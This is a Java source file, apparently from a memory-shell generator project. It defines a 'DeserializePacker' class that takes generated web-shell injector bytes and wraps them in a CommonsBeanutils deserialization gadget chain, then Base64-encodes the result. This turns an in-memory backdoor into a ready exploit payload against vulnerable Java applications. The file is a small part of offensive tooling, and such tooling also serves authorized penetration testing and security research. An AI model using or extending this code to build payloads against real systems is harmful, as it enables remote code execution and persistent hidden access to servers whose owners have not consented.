package com.reajason.javaweb.memshell.packer;

import com.reajason.javaweb.memshell.config.GenerateResult;
import com.reajason.javaweb.deserialize.DeserializeConfig;
import com.reajason.javaweb.deserialize.DeserializeGenerator;
import com.reajason.javaweb.deserialize.PayloadType;
import lombok.SneakyThrows;
import org.apache.commons.codec.binary.Base64;

/**
 * @author ReaJason
 * @since 2024/12/10
 */
public class DeserializePacker implements Packer {

    @Override
    @SneakyThrows
    public String pack(GenerateResult generateResult) {
        DeserializeConfig deserializeConfig = new DeserializeConfig();
        deserializeConfig.setPayloadType(PayloadType.CommonsBeanutils19);
        return Base64.encodeBase64String(DeserializeGenerator.generate(generateResult.getInjectorBytes(), deserializeConfig));
    }
}